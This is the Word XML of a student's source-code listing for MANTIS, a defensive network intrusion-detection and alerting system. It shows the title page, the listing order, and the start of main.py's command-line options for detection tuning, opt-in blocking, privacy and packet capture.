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6094F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D0FD039" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12B40CB7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="205876DD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CD4C077" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08E8A0AD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="160"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="52"/>
        </w:rPr>
        <w:t>MANTIS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F68C1AC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="360"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Minimalist Alert Network for Threat Intelligence System</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50DABF7F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="640"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t>Source Code Listings</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F14712" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Anuskar Sigdel</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4078DF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Student Number: 24812606</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D69DC41" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>BSc (Hons) Computing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="013369E8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>University of Northampton</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7296EA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>September 2026</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43145A3D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED6A338" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Document Scope</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B40A7C3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>This document contains the maintained executable source code submitted with MANTIS. It lists 36 non-empty implementation, interface, test, shell, configuration and dependency files comprising 8,802 lines. The listings are reproduced without syntax colouring.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A70A69A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Datasets, the saved brain JSON, the licence, checksums and the operational README are included in the executable package but are not repeated here because they are data or documentation rather than source code. Empty __init__.py package markers are also present in the executable package.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB435B7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Listing Order</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="427D8A2B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Entry Points and Orchestration: 2 files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="652A618B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Dashboard, SIEM and Reporting: 4 files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25ED0E1B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Detection Engines: 6 files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1242D7E9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Sensor Node: 3 files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2961BEAB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Training and Evaluation: 3 files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25DC625E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Utilities: 7 files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12B66520" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Automated Test Suite: 5 files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A524035" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Installation and Demonstration Scripts: 3 files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40762B50" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Configuration and Dependency Files: 3 files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="106871DC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="11E4B794" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Entry Points and Orchestration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E635427"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src/main.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13A0162A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>222 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F7F135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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4916A2E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argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0474B37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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C15A8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queue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35EE59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socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F0ECC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sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CB9254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threading</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D6EB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time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21196D9B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="678E940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dashboard_ui.dashboard as dashboard</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D267C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sensor_node.sensor as sensor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E4FC5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from utils.config import CONFIG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B1596B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EC0201C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B9C9B8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parse_args(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="620768B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 = argparse.ArgumentParser(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51490E6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prog="mantis",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ABB814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description="MANTIS - Minimalist Alert Network for Threat "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="065C640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"Intelligence System",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="217640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epilog="Active defence is OFF unless --block is given (NFR-3).")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="509648AB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="306EA8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p.add_argument("--remote", default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2050A02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help="dashboard server IP (distributed mode)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="501C62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p.add_argument("--port", type=int, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C0D680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help="udp telemetry port (default 9999)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="595DE8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p.add_argument("--mode", choices=["cli", "web"], default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02AC993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help="skip the interactive prompt and pick a UI")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="327EA75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p.add_argument("--config", default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE6EF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help="json config file to load")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197B2CBE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2570453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detection tuning ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F1B76A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p.add_argument("--zscore-threshold", type=float, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BA3458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help="z-score alert threshold (default 3.0)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01AE03C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p.add_argument("--zscore-window", type=int, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BD315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help="rolling baseline window in seconds (default 30)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BED8CA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p.add_argument("--ddos-min-pps", type=int, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="233A8EE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help="minimum packet rate eligible for DDoS (default 500)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1888D1B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p.add_argument("--ddos-consecutive",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E324B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dest="ddos_consecutive_intervals",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C0541C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type=int, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B91DF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help="consecutive anomalous seconds required (default 3)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BFB9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p.add_argument("--knn-k", type=int, default=None, help="KNN neighbours")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3CD1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p.add_argument("--alert-dedup-seconds", type=float, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E3FCF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help="suppress identical alerts for this long (default 5)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4118E9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p.add_argument("--source-attribution-min-share", type=float, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B460A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help="minimum dominant-source traffic share required to "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69EC62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"attribute interval alerts (default 0.50)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C904F18" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="373723A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response (NFR-3: opt-in) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5960D3D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p.add_argument("--block", dest="block_enabled", action="store_true",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72AC45E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default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5601DA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help="ENABLE iptables blocking (off by default)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202179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p.add_argument("--block-on", default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F37159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help="comma list of kinds that may trigger a block "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F44893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"(payload,blacklist,ddos,scan)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4351D043" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34AF71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privacy (NFR-3 / GDPR) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49ACDE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p.add_argument("--no-privacy", dest="privacy_mode", action="store_false",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E17E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default=None, help="disable PII redaction in logs")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70BE6A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p.add_argument("--anonymise-ips", dest="anonymise_ips",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F5BE7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action="store_true", default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1597EE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help="mask the last octet of IPs in persisted logs")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00AB9BA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p.add_argument("--payload-excerpt-bytes", type=int, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="527FB38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help="payload excerpt limit in bytes (default 64)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08173C08" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E66B2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forensics ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E48A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p.add_argument("--pcap-file", default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA7075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help="write a live libpcap capture (opens in Wireshark)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D1B86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p.add_argument("--pcap-snaplen", type=int, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="609BFD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help="bytes captured per frame (default 96, headers only)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B56B07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p.add_argument("--blacklist-file", default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BCAB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help="threat-intel IP feed, one indicator per line")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1DB0F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p.add_argument("--log-file", default=None, help="csv audit log path")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A1AE13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p.add_argument("--packet-buffer", type=int, default=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="243E49D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help="in-memory packet ring buffer size (default 5000)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A31DDD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00BD64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p.parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC84B91" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B07F6A9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B8E6F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BANNER = r"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5258BE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__  ___ ___   _   _  _____  ___   ____</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="318A1F7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   | / | / /|_   _|/ _ \ / ___|</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE4E8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/|_/ // /| |/  |/ /   | | | | | |\___ \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC1D82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 // ___ / /|  /    | | | |_| | ___) |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598E382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/_/  /_//_/  |_/_/ |_/    |_|  \___/ |____/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400DA7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Minimalist Alert Network for Threat Intelligence System</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F12F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4DC2D3F6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="464A6912" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FADB62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has_raw_capture_access():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36329F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True when this process can open the Linux capture socket.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F22E809" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="092C87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Root is not the only valid case: install.sh can grant CAP_NET_RAW to the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C55FD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Python interpreter, so a non-root `mantis` process may be fully authorised.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59EB21D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Probing the actual socket keeps both `mantis` and `sudo mantis` honest.</w:t>
      </w:r>
    </w:p>
